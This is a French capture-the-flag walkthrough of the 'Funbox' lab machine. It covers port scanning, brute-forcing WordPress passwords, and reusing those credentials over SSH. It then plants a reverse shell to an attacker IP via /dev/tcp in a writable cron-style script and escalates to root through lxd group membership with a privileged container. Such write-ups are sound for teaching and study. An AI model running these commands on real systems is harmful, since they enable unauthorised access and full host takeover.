# Funbox

	sudo masscan -p1-65535,U:1-65535 192.168.249.77 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.249.77 -oN nmap.txt
	feroxbuster --silent -u http://192.168.249.77

Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp ProFTPD  
	22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  
	33060/tcp open mysqlx?

Feroxbuster trouve pas mal de chemins WordPress. En cherchant la page de login j'ai été redirigé vers http://funbox.fritz.box/wp-login.php et j'ai dû rajouter ce nom dans mon fichier /etc/hosts pour pouvoir scanner le site : 

	echo "192.168.249.77 funbox.fritz.box" >> /etc/hosts
	wpscan --url http://funbox.fritz.box/ --enumerate -v
	wpscan --url http://funbox.fritz.box/ --enumerate -v -P ~/wordlists/rockyou.txt

=> Deux utilisateurs trouvés : Admin et Joe
</br>=> Mot de passe trouvé pour les deux
</br>=> Version 5.4.2

Vérification des mots de passe sur les autres services : 

	ftp admin@192.168.249.77 	# FAIL
	ssh admin@192.168.249.77	# FAIL
	ftp joe@192.168.249.77 		# OK
	ssh joe@192.168.249.77		# OK
	...
	cat ~/local.txt
	
### Pivoting et élévation de privilèges : 

	python -c 'import pty;pty.spawn("/bin/bash")'

	cat ./mbox
	ls /home
	ls /home/funny -la
	cat /home/funny/.reminder.sh
	cat /home/funny/.backup.sh

Je n'ai pas trouvé de tâches planifiées lançant ce script mais je me dis que c'est peut-être dû au fait que je n'ai pas tous les droits, et comme il est ouvert en écriture autant tenter de le modifier quand même. Il appartient à l'utilisateur "Funny" donc je ne pourrai pas directement utiliser la technique du SUID sur /bin/bash, mais je vais pouvoir obtenir un reverse-shell en tant que Funny.

	echo "sh -i >& /dev/tcp/192.168.45.158/443 0>&1" >> /home/funny/.backup.sh
	==========
	rlwrap nc -nvlp 443
	...
	whoami
	id

> uid=1000(funny) gid=1000(funny) groups=1000(funny),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
	
Des élévations de privilèges existent si un utilisateur appartient au groupe lxd.

Voir : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

Ajout du bon chemin dans PATH :
	
	find / -name "lxd" 2>/dev/null
	find / -name "lxc" 2>/dev/null
	export PATH=$PATH:/snap/bin

Préparation sur ma machine d'attaque : 

	sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
	git clone https://github.com/lxc/distrobuilder
	cd distrobuilder
	make
	mkdir -p ~/ContainerImages/alpine/
	cd ~/ContainerImages/alpine/
	wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
	sudo /home/timothe/go/bin/distrobuilder build-lxd /home/timothe/ContainerImages/alpine/alpine.yaml -o image.release=3.8
	python -m http.server 8000

Réception côté cible : 

	lxd init
	wget http://192.168.45.158:8000/lxd.tar.xz 
	wget http://192.168.45.158:8000/rootfs.squashfs
	lxc init alpine privesc -c security.privileged=true
	lxc list
	lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
	lxc start privesc 
	lxc exec privesc /bin/sh
	
	cat /root/proof.txt
	
